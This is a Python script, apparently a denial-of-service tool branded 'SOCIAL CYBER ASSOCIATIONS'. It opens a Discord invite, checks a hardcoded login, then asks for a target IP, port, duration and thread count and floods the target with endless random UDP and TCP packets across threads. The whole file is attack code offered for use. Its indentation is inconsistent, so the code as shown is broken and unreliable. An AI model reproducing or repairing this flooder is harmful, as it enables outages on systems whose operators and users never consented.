#AUTHOR SOCIAL CYBER ASSOCIATIONS
import random
import socket
import threading
import os
import sys
import time

###### MESSAGE SCA ON TOP! #####
os.system("clear")
os.system("xdg-open https://discord.gg/8gmRVnRRwV")
print("\u001b[35m Welcome to SOCIAL CYBER ASSOCIATIONS World")
print("\u001b[35m NA HACK KANA GAR IYAK KNA")
time.sleep(5)
print("Loading.......")
os.system("clear")
os.system("xdg-open")

#### Login       

attemps = 0

while attemps < 100:
    username = input('Enter your username: ')
    password = input('Enter your password: ')

    if username == 'SCA' and password == 'SCA':
        print('You have successfully logged in Welcome to SCA!!')
        break
    else:
        print('Incorrect credentials. Check if you have Caps lock on and try again.')
        attemps += 1
        continue
os.system("clear")

print("""
\u001b[35m
	  AUTHOR TOOLS : SCA
		╔═╗╔═╗   ╔═╗
		╚═╗║         ╠═╣
		╚═╝╚═╝      ╩  V1.1
""")

ip = str(input(" Target IP :"))
port = int(input(" Target Port :"))
choice = str(input(" (y/n) :"))
times = int(input(" Time :"))
threads = int(input(" Threads :"))
def run():
				data = random._urandom(1024)
				i = random.choice(("[*]","[!]","[#]"))
				while True:
					try:
						s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
						addr = (str(ip),int(port))
						for x in range(times):
							s.sendto(data,addr)
						print(i +"SCA ATTACK SENT!!")
					except:
						print("[!] Error!!!")
			
			def run2():
				data = random._urandom(999)
				i = random.choice(("[*]","[!]","[#]"))
				while True:
					try:
						s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
						s.connect((ip,port))
						s.send(data)
						for x in range(times):
							s.send(data)
						print(i +"SCA ATTACK SENT!!")
					except:
						s.close()
						print("[*] Error!!!")
			            
			
			def run3():
				data = random._urandom(818)
				i = random.choice(("[*]","[!]","[#]"))
				while True:
					try:
						s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
						s.connect((ip,port))
						s.send(data)
						for x in range(times):
							s.send(data)
						print(i +"SCA ATTACK SENT!!")
					except:
						s.close()
						print("[*] Error!!!")
			            
			  
			def run4():
				data = random._urandom(16)
				i = random.choice(("[•]","[!]","[•]"))
				while True:
					try:
						s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
						s.connect((ip,port))
						s.send(data)
						for x in range(times):
							s.send(data)
						print(i +"SCA ATTACK SENT!!")
					except:
						s.close()
						print("[*] Error!!!")
														
			            
			for y in range(threads):
				if choice == 'y':
					th = threading.Thread(target = run)
					th.start()
					th = threading.Thread(target = run2)
					th.start()
					th = threading.Thread(target = run3)
					th.start()
			else:
					th = threading.Thread(target = run4)
					th.start()
